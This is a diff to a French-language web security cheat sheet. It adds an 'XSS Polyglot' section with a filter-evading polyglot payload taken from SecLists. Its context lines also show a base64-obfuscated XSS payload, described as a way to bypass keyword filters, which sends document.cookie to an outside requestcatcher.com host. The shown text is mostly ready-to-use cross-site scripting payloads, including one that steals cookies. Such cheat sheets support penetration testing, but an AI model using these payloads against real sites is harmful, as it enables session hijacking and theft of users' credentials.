@@ -5,6 +5,7 @@
 - [API](#api)
 - [Obfuscation Javascript](#obfuscation-javascript)
 - [XSS (Cross Site Scripting)](#xss-cross-site-scripting)
+  - [XSS Polyglot](#xss-polyglot)
 - [Scan d'URL web](#scan-durl-web)
 - [Injection SQL](#injection-sql)
 - [TLS](#tls)
@@ -63,6 +64,13 @@ document.body.appendChild(script);
 
 // Pour bypass les filtres qui recherchent des mots clés : base64 encoded payload
 <body onload="eval(atob('dmFyIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO3NjcmlwdC5zcmMgPSAiaHR0cHM6Ly9idXN0ZXJiYXh0ZXIucmVxdWVzdGNhdGNoZXIuY29tLyIgKyBkb2N1bWVudC5jb29raWU7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzY3JpcHQpOw=='))">
+```
+
+### XSS Polyglot
+
+https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Polyglots/XSS-Polyglot-Ultimate-0xsobky.txt :
+```js
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('Life found a way !') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('Life found a way !')//>\x3e
 ```
 
 ## Scan d'URL web
